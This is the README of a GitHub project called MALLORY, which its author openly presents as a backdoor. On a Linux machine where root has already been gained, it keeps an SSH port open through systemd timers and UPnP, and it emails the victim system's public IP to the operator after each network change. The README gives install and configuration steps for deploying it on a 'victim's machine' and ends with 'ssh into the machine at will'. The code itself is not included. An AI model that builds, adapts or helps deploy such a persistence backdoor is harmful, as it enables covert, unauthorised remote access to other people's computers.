# MALLORY :door:
This is a simple backdoor script i wrote, just for fun.
The main requirement is a working `systemd` installation on your linux distro.

The main scope of this 'backdoor' is to keep an open port to the system it is installed on,
and have that port point to an ssh service.

In order to always have access to the public ip of the system it is installed on,
the backdoor will send emails to your email address each time a network or system configuration
change occurs.

_WARNING: emails will probably end up in your Spam folder!_

**IMPORTANT: this "backdoor" DOES NOT provide automatic root access. you must already have gained root access on the victim's machine to use this!**

### Dependencies
- **systemd** (for systemd master race)
- **ip tools suite** (for network scan)
- **curl** (for network scan)
- **ipecho.net/plain** website must be up (for network scan)
- **postfix** daemon running (for sending emails)
- **md5sum** (for hashing of data)
- **miniupnp** client (for upnp configuration)

### TODO
- automate postfix installation on ubuntu might be problematic?
    - postfix might have trouble sending to !=gmail domains on ubuntu?
- what to do if upnp disabled on router??
- only try upnp -a if upnp is up but port is closed (move upnp check)
    - and then maybe check again (before sending email) ?
- fix ip detection (especially public ip): if no ip is found, only empty space or error msg is printed to the email!
- check for upnpc failure errors?
- check for services available (installed) in install script?
- make package installation page and perhaps check script under setup.sh

### Files
- `backdoor.sh` - the script that notifies us of network or system configuration changes. is replaces dyndns functionality.
- `setup.sh` - the script used to configure and install/uninstall the backdoor.
- `backdoor.timer` - it is a systemd timer unit file, commonly used for executing time-relative tasks. I've chosen to
use this instead of _cron_ because it also easily allows me to **control ssh and postfix** services. Whenever the timer
"rings" it will execute `backdoor.service`
- `backdoor.service` - a common systemd service unit file, often used to handle daemons under systemd. This service is not kept running, and is automatically executed by the timer whenever needed. It can also wakeup the `ssh` and `postfix` services if needed :wink:

### Configuration
just edit some variables under the `config` function found in `setup.sh`:

- _email_: the email address where you expect to receive the system info
- _sshservice_: the name of the ssh service for your distro (check comments for help)
- _user_: the user which will be executing the backdoor, it mainly affects the determination of `~` in file paths and therefore the location for the backdoor hash file.
- _time_: how much time occurs between backdoor runs (check comments for help)

### Installation
Very easy.
Clone the project:
``` sh
$ git clone https://github.com/mabbamOG/MALLORY.git
$ cd MALLORY
```
Configure the backdoor by editing variables in `setup.sh` (look for a function named `config`).
```sh
$ nano setup.sh
```
Next install the backdoor using appropriate command:
 ```sh
$ sudo bash setup.sh install
```
Then check everything is working throught appropriate `systemctl` commands.
**Done :) :thumbsup:**

### Usage
Check your emails often and ssh into the machine at will. lol.

### Credits
[The Arch Wiki](https://wiki.archlinux.org) - ever so caring

### License
[![Public Domain Mark](http://i.creativecommons.org/p/mark/1.0/88x31.png)](http://creativecommons.org/publicdomain/mark/1.0/)  
This work (**[MALLORY](https://github.com/mabbamOG/MALLORY.git), by mabbamOG)**, identified by **[mabbamOG](https://github.com/mabbamOG)**, is free of known copyright restrictions.
